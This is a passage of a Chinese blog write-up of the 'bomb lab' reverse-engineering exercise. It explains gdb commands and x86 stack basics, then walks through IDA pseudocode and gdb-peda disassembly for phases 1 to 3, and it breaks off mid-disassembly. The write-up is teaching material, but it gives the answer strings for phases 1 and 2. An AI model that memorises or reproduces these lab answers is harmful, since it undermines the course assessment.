&lt;file name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置断点</span></span><br><span class="line">b &lt;地址或函数名等&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># (重新)运行程序，若有断点，会卡在第一个断点</span></span><br><span class="line">r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 继续执行程序至下一个断点</span></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行一(n)条指令，进入call</span></span><br><span class="line">s &lt;n&gt;</span><br><span class="line"><span class="comment"># 执行一(n)条指令，不进入call</span></span><br><span class="line">n &lt;n&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看断点</span></span><br><span class="line">info b</span><br><span class="line">i b</span><br><span class="line"><span class="comment"># 删除断点 n为断点编号</span></span><br><span class="line">delete &lt;n&gt;</span><br><span class="line">d &lt;n&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反汇编，func为某个函数</span></span><br><span class="line">disassemble &lt;func&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示addr处的内存信息</span></span><br><span class="line">x/nfu &lt;addr&gt;</span><br><span class="line"><span class="comment">#n表示输出单元的个数</span></span><br><span class="line"><span class="comment">#f是输出格式。比如x是以16进制形式输出，o是以8进制形式输出等等。</span></span><br><span class="line"><span class="comment">#u标明一个单元的长度。b是一个byte，h是两个byte（halfword），w是四个byte（word），g是八个byte（giant word）。</span></span><br></pre></td></tr></table></figure><h2 id="13-计组知识"><a class="markdownIt-Anchor" href="#13-计组知识"></a> 1.3 计组知识</h2><p><strong>汇编格式</strong>：</p><ul><li>Intel格式：目的操作数在左，MASM采用</li><li>AT&amp;T格式：目的操作数在右，objdump和gcc默认格式</li></ul><p><strong>栈</strong>：</p><ul><li>先进后出</li><li>从高地址向低地址增长</li><li>ESP指向栈顶</li><li>EBP指向栈底</li></ul><p><strong>大小端模式</strong>：</p><ul><li>大端（Big-Endian）：高字节存低地址，低字节存低高地址</li><li>小端（Little-Endian）：低字节存低地址，高字节存高地址</li></ul><p><strong>常见指令</strong>：</p><ul><li><code>push</code>：R[sp] ← R[sp] - 2 或者  R[esp] ← R[esp] - 4，然后将一个字或双字从指定寄存器送到SP或者ESP指示的单元；</li><li><code>pop</code>：然后将一个字或双字从SP或者ESP指示的单元送到指定寄存器，再执行R[sp] ← R[sp] + 2 或者  R[esp] ← R[esp] + 4</li><li><code>call &lt;func_addr&gt;</code>：先push EIP（当前指令的第一条指令地址），再执行jmp &lt;func_addr&gt;</li><li><code>ret</code>：pop EIP</li><li><code>leave</code>：先执行mov %ebp %esp，再pop %ebp</li></ul><h2 id="14-lab概览"><a class="markdownIt-Anchor" href="#14-lab概览"></a> 1.4 lab概览</h2><p>通过IDA打开bomb文件，找到主函数main，发现需要需要进行六次输入，对应phase_1到phase_6函数，每次输入需要躲开explode_bomb()函数，否则拆炸弹失败。</p><h1 id="2-phase_1"><a class="markdownIt-Anchor" href="#2-phase_1"></a> 2 phase_1</h1><h2 id="21-解析"><a class="markdownIt-Anchor" href="#21-解析"></a> 2.1 解析</h2><p>IDA查看phase_1函数伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">phase_1</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = strings_not_equal(a1, <span class="string">"And they have no disregard for human life."</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gdb查看phase_1函数汇编代码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble phase_1</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> phase_1:</span><br><span class="line">=&gt; 0x00401662 &lt;+0&gt;:     endbr32</span><br><span class="line">   0x00401666 &lt;+4&gt;:     push   ebp</span><br><span class="line">   0x00401667 &lt;+5&gt;:     mov    ebp,esp</span><br><span class="line">   0x00401669 &lt;+7&gt;:     push   ebx</span><br><span class="line">   0x0040166a &lt;+8&gt;:     sub    esp,0xc</span><br><span class="line">   0x0040166d &lt;+11&gt;:    call   0x4013d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x00401672 &lt;+16&gt;:    add    ebx,0x38f2</span><br><span class="line">   0x00401678 &lt;+22&gt;:    lea    eax,[ebx-0x1e20]</span><br><span class="line">   0x0040167e &lt;+28&gt;:    push   eax</span><br><span class="line">   0x0040167f &lt;+29&gt;:    push   DWORD PTR [ebp+0x8]</span><br><span class="line">   0x00401682 &lt;+32&gt;:    call   0x401bdf &lt;strings_not_equal&gt;</span><br><span class="line">   0x00401687 &lt;+37&gt;:    add    esp,0x10</span><br><span class="line">   0x0040168a &lt;+40&gt;:    <span class="built_in">test</span>   eax,eax</span><br><span class="line">   0x0040168c &lt;+42&gt;:    jne    0x401693 &lt;phase_1+49&gt;</span><br><span class="line">   0x0040168e &lt;+44&gt;:    mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x00401691 &lt;+47&gt;:    leave</span><br><span class="line">   0x00401692 &lt;+48&gt;:    ret</span><br><span class="line">   0x00401693 &lt;+49&gt;:    call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x00401698 &lt;+54&gt;:    jmp    0x40168e &lt;phase_1+44&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="22-思路"><a class="markdownIt-Anchor" href="#22-思路"></a> 2.2 思路</h2><p>看伪代码直接得出答案，输入需要与给定字符串一致。</p><hr><p>如果不看伪代码，使用gdb动态调试则：</p><ol><li><p>载入bomb：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ gdb bomb</span><br><span class="line">GNU gdb (Debian 8.2.1-2+b3) 8.2.1</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type <span class="string">"show copying"</span> and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"i686-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</span><br><span class="line"></span><br><span class="line">warning: build/bdist.linux-i686/wheel/peda/peda.py: No such file or directory</span><br><span class="line">Reading symbols from bomb...done.</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure></li><li><p>在main函数处打断点，并执行到该断点：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b main</span><br><span class="line">Breakpoint 1 at 0x14cd: file bomb.c, line 37.</span><br><span class="line">gdb-peda$ r</span><br></pre></td></tr></table></figure></li><li><p>在phase_1函数处打断点，并执行到该断点：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b phase_1</span><br><span class="line">Breakpoint 2 at 0x401662</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x401651 &lt;main+388&gt;: call   0x401300 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x401656 &lt;main+393&gt;: mov    DWORD PTR [esp],0x8</span><br><span class="line">   0x40165d &lt;main+400&gt;: call   0x4012a0 &lt;<span class="built_in">exit</span>@plt&gt;</span><br><span class="line">=&gt; 0x401662 &lt;phase_1&gt;:  endbr32</span><br><span class="line">   0x401666 &lt;phase_1+4&gt;:        push   ebp</span><br><span class="line">   0x401667 &lt;phase_1+5&gt;:        mov    ebp,esp</span><br><span class="line">   0x401669 &lt;phase_1+7&gt;:        push   ebx</span><br><span class="line">   0x40166a &lt;phase_1+8&gt;:        sub    esp,0xc</span><br></pre></td></tr></table></figure></li><li><p>执行8步到<code>0x0040167e &lt;+28&gt;: push eax</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ n 8</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x403144 (<span class="string">"And they have no disregard for human life."</span>)</span><br><span class="line">EBX: 0x404f64 --&gt; 0x4e6c (<span class="string">'lN'</span>)</span><br><span class="line">ECX: 0x2b (<span class="string">'+'</span>)</span><br><span class="line">EDX: 0x1</span><br><span class="line">ESI: 0xbffff574 --&gt; 0xbffff6bf (<span class="string">"/home/liuzhenlong/lab_debug/bomb_162020203/bomb95/bomb"</span>)</span><br><span class="line">EDI: 0xb7fbc000 --&gt; 0x1d9d6c</span><br><span class="line">EBP: 0xbffff498 --&gt; 0xbffff4c8 --&gt; 0x0</span><br><span class="line">ESP: 0xbffff488 --&gt; 0xb7e13cb9 (&lt;__new_exitfn+9&gt;:       add    ebx,0x1a8347)</span><br><span class="line">EIP: 0x40167e (&lt;phase_1+28&gt;:    push   eax)</span><br><span class="line">EFLAGS: 0x202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x40166d &lt;phase_1+11&gt;:       call   0x4013d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x401672 &lt;phase_1+16&gt;:       add    ebx,0x38f2</span><br><span class="line">   0x401678 &lt;phase_1+22&gt;:       lea    eax,[ebx-0x1e20]</span><br><span class="line">=&gt; 0x40167e &lt;phase_1+28&gt;:       push   eax</span><br><span class="line">   0x40167f &lt;phase_1+29&gt;:       push   DWORD PTR [ebp+0x8]</span><br><span class="line">   0x401682 &lt;phase_1+32&gt;:       call   0x401bdf &lt;strings_not_equal&gt;</span><br><span class="line">   0x401687 &lt;phase_1+37&gt;:       add    esp,0x10</span><br><span class="line">   0x40168a &lt;phase_1+40&gt;:       <span class="built_in">test</span>   eax,eax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff488 --&gt; 0xb7e13cb9 (&lt;__new_exitfn+9&gt;:      add    ebx,0x1a8347)</span><br><span class="line">0004| 0xbffff48c --&gt; 0x404f64 --&gt; 0x4e6c (<span class="string">'lN'</span>)</span><br><span class="line">0008| 0xbffff490 --&gt; 0xbffff574 --&gt; 0xbffff6bf (<span class="string">"/home/liuzhenlong/lab_debug/bomb_162020203/bomb95/bomb"</span>)</span><br><span class="line">0012| 0xbffff494 --&gt; 0x404f64 --&gt; 0x4e6c (<span class="string">'lN'</span>)</span><br><span class="line">0016| 0xbffff498 --&gt; 0xbffff4c8 --&gt; 0x0</span><br><span class="line">0020| 0xbffff49c --&gt; 0x40155a (&lt;main+141&gt;:      call   0x40203c &lt;phase_defused&gt;)</span><br><span class="line">0024| 0xbffff4a0 --&gt; 0x405760 (<span class="string">"And they have no disregard for human life."</span>)</span><br><span class="line">0028| 0xbffff4a4 --&gt; 0x404f64 --&gt; 0x4e6c (<span class="string">'lN'</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0040167e <span class="keyword">in</span> phase_1 ()</span><br></pre></td></tr></table></figure><p>此时可以看到EAX中所指向的字符串，也就是答案。</p></li></ol><p><strong>答案</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">And they have no disregard <span class="keyword">for</span> human life.</span><br></pre></td></tr></table></figure><h1 id="3-phase_2"><a class="markdownIt-Anchor" href="#3-phase_2"></a> 3 phase_2</h1><h2 id="31-解析"><a class="markdownIt-Anchor" href="#31-解析"></a> 3.1 解析</h2><p>IDA查看phase_2函数伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">read_six_numbers</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = __isoc99_sscanf(a1, &amp;unk_33A1, a2, a2 + <span class="number">4</span>, a2 + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span class="number">5</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">phase_2</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v3[<span class="number">5</span>]; <span class="comment">// [esp+Ch] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+20h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+24h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  read_six_numbers(a1, v3);</span><br><span class="line">  <span class="keyword">if</span> ( v3[<span class="number">0</span>] != <span class="number">1</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  v1 = v3;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1[<span class="number">1</span>] != <span class="number">2</span> * *v1 )</span><br><span class="line">      explode_bomb();</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != (<span class="keyword">int</span> *)&amp;v4 );</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gdb查看phase_2函数汇编代码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble phase_2</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> phase_2:</span><br><span class="line">   0x0040169a &lt;+0&gt;:     endbr32</span><br><span class="line">   0x0040169e &lt;+4&gt;:     push   ebp</span><br><span class="line">   0x0040169f &lt;+5&gt;:     mov    ebp,esp</span><br><span class="line">   0x004016a1 &lt;+7&gt;:     push   edi</span><br><span class="line">   0x004016a2 &lt;+8&gt;:     push   esi</span><br><span class="line">   0x004016a3 &lt;+9&gt;:     push   ebx</span><br><span class="line">   0x004016a4 &lt;+10&gt;:    sub    esp,0x34</span><br><span class="line">   0x004016a7 &lt;+13&gt;:    call   0x4013d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x004016ac &lt;+18&gt;:    add    ebx,0x38b8</span><br><span class="line">   0x004016b2 &lt;+24&gt;:    mov    eax,gs:0x14</span><br><span class="line">   0x004016b8 &lt;+30&gt;:    mov    DWORD PTR [ebp-0x1c],eax</span><br><span class="line">   0x004016bb &lt;+33&gt;:    xor    eax,eax</span><br><span class="line">   0x004016bd &lt;+35&gt;:    lea    eax,[ebp-0x34]</span><br><span class="line">   0x004016c0 &lt;+38&gt;:    push   eax</span><br><span class="line">   0x004016c1 &lt;+39&gt;:    push   DWORD PTR [ebp+0x8]</span><br><span class="line">   0x004016c4 &lt;+42&gt;:    call   0x401eba &lt;read_six_numbers&gt;</span><br><span class="line">   0x004016c9 &lt;+47&gt;:    add    esp,0x10</span><br><span class="line">   0x004016cc &lt;+50&gt;:    cmp    DWORD PTR [ebp-0x34],0x1</span><br><span class="line">   0x004016d0 &lt;+54&gt;:    jne    0x4016da &lt;phase_2+64&gt;</span><br><span class="line">   0x004016d2 &lt;+56&gt;:    lea    esi,[ebp-0x34]</span><br><span class="line">   0x004016d5 &lt;+59&gt;:    lea    edi,[ebp-0x20]</span><br><span class="line">   0x004016d8 &lt;+62&gt;:    jmp    0x4016ed &lt;phase_2+83&gt;</span><br><span class="line">   0x004016da &lt;+64&gt;:    call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x004016df &lt;+69&gt;:    jmp    0x4016d2 &lt;phase_2+56&gt;</span><br><span class="line">   0x004016e1 &lt;+71&gt;:    call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x004016e6 &lt;+76&gt;:    add    esi,0x4</span><br><span class="line">   0x004016e9 &lt;+79&gt;:    cmp    esi,edi</span><br><span class="line">   0x004016eb &lt;+81&gt;:    je     0x4016f8 &lt;phase_2+94&gt;</span><br><span class="line">   0x004016ed &lt;+83&gt;:    mov    eax,DWORD PTR [esi]</span><br><span class="line">   0x004016ef &lt;+85&gt;:    add    eax,eax</span><br><span class="line">   0x004016f1 &lt;+87&gt;:    cmp    DWORD PTR [esi+0x4],eax</span><br><span class="line">   0x004016f4 &lt;+90&gt;:    je     0x4016e6 &lt;phase_2+76&gt;</span><br><span class="line">   0x004016f6 &lt;+92&gt;:    jmp    0x4016e1 &lt;phase_2+71&gt;</span><br><span class="line">   0x004016f8 &lt;+94&gt;:    mov    eax,DWORD PTR [ebp-0x1c]</span><br><span class="line">   0x004016fb &lt;+97&gt;:    xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x00401702 &lt;+104&gt;:   jne    0x40170c &lt;phase_2+114&gt;</span><br><span class="line">   0x00401704 &lt;+106&gt;:   lea    esp,[ebp-0xc]</span><br><span class="line">   0x00401707 &lt;+109&gt;:   pop    ebx</span><br><span class="line">   0x00401708 &lt;+110&gt;:   pop    esi</span><br><span class="line">   0x00401709 &lt;+111&gt;:   pop    edi</span><br><span class="line">   0x0040170a &lt;+112&gt;:   pop    ebp</span><br><span class="line">   0x0040170b &lt;+113&gt;:   ret</span><br><span class="line">   0x0040170c &lt;+114&gt;:   call   0x402e00 &lt;__stack_chk_fail_local&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="32-思路"><a class="markdownIt-Anchor" href="#32-思路"></a> 3.2 思路</h2><p>从伪代码看：需要输入6个数字，而且第一个数字为1，后面的数字是前面的两倍。</p><p><strong>答案</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 2 4 8 16 32</span><br></pre></td></tr></table></figure><h1 id="4-phase_3"><a class="markdownIt-Anchor" href="#4-phase_3"></a> 4 phase_3</h1><h2 id="41-解析"><a class="markdownIt-Anchor" href="#41-解析"></a> 4.1 解析</h2><p>IDA查看phase_3函数伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">phase_3</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2[<span class="number">3</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">1</span>] = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( __isoc99_sscanf(a1, <span class="string">"%d %d"</span>, &amp;v1, v2) &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">7</span> )</span><br><span class="line">      __asm &#123; jmp     edx &#125;</span><br><span class="line">    explode_bomb();</span><br><span class="line">  &#125;</span><br><span class="line">  explode_bomb();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gdb查看phase_3函数汇编代码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble phase_3</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> phase_3:</span><br><span class="line">=&gt; 0x00401711 &lt;+0&gt;:     endbr32</span><br><span class="line">   0x00401715 &lt;+4&gt;:     push   ebp</span><br><span class="line">   0x00401716 &lt;+5&gt;:     mov    ebp,esp</span><br><span class="line">   0x00401718 &lt;+7&gt;:     push   ebx</span><br><span class="line">   0x00401719 &lt;+8&gt;:     sub    esp,0x14</span><br><span class="line">   0x0040171c &lt;+11&gt;:    call   0x4013d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x00401721 &lt;+16&gt;:    add    ebx,0x3843</span><br><span class="line">   0x00401727 &lt;+22&gt;:    mov    eax,gs:0x14</span><br><span class="line">   0x0040172d &lt;+28&gt;:    mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x00401730 &lt;+31&gt;:    xor    eax,eax</span><br><span class="line">   0x00401732 &lt;+33&gt;:    lea    eax,[ebp-0x10]</span><br><span class="line">   0x00401735 &lt;+36&gt;:    push   eax</span><br><span class="line">   0x00401736 &lt;+37&gt;:    lea    eax,[ebp-0x14]</span><br><span class="line">   0x00401739 &lt;+40&gt;:    push   eax</span><br><span class="line">   0x0040173a &lt;+41&gt;:    lea    eax,[ebx-0x1bb7]</span><br><span class="line">   0x00401740 &lt;+47&gt;:    push   eax</span><br><span class="line">   0x00401741 &lt;+48&gt;:    push   DWORD PTR [ebp+0x8]</span><br><span class="line">   0x00401744 &lt;+51&gt;:    call   0x4012d0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x00401749 &lt;+56&gt;:    add    esp,0x10</span><br><span class="line">   0x0040174c &lt;+59&gt;:    cmp    eax,0x1</span><br><span class="line">   0x0040174f &lt;+62&gt;:    jle    0x40176a &lt;phase_3+89&gt;</span><br><span class="line">   0x00401751 &lt;+64&gt;:    cmp    DWORD PTR [ebp-0x14],0x7</span><br><span class="line">   0x00401755 &lt;+68&gt;:    ja     0x4017e1 &lt;phase_3+208&gt;</span><br><span class="line">   0x0040175b &lt;+74&gt;:    mov    eax,DWORD PTR [ebp-0x14]</span><br><span class="line">   0x0040175e &lt;+77&gt;:    mov    edx,ebx</span><br><span class="line">   0x00401760 &lt;+79&gt;:    add    edx,DWORD PTR [ebx+eax*4-0x1dc4]</span><br><span class="line">   0x00401767 &lt;+86&gt;:    notrack jmp edx</span><br><span class="line">   0x0040176a &lt;+89&gt;:    call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x0040176f &lt;+94&gt;:    jmp    0x401751 &lt;phase_3+64&gt;</span><br><span class="line">   0x00401771 &lt;+96&gt;:    mov    eax,0x398</span><br><span class="line">   0x00401776 &lt;+101&gt;:   sub    eax,0xd8</span><br><span class="line">   0x0040177b &lt;+106&gt;:   add    eax,0x1ad</span><br><span class="line">   0x00401780 &lt;+111&gt;:   sub    eax,0x3e</span><br><span class="line">   0x00401783 